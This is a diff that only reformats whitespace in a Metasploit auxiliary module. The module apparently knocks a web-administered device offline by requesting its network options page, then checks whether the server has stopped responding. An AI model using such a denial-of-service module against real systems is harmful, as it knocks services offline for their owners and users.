@@ -32,14 +32,14 @@ class Metasploit3 < Msf::Auxiliary
 			'DisclosureDate' => 'Jun 18 2013'))
 	end
 
-        def is_alive?
+	def is_alive?
 		res = send_request_raw({
 			'method'	=>	'GET',
 			'uri'		=>	'/',
 		},10)
-		
+
 		return !res.nil?
-        end
+	end
 
 	def run
 
@@ -73,7 +73,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
 				print_error("Couldn't connect to #{rhost}:#{rport}")
-				return
+			return
 		end
 
 		# The second request will load the network options page, which seems to trigger the DoS
@@ -84,10 +84,10 @@ class Metasploit3 < Msf::Auxiliary
 
 		# Check to see if it worked or not
 		if is_alive?
-                        print_error("#{rhost}:#{rport} - Server is still alive")
-                else
-                        print_good("#{rhost}:#{rport} - Connection Refused: Success!")
-                end
+			print_error("#{rhost}:#{rport} - Server is still alive")
+		else
+			print_good("#{rhost}:#{rport} - Connection Refused: Success!")
+		end
 
 	end
 end
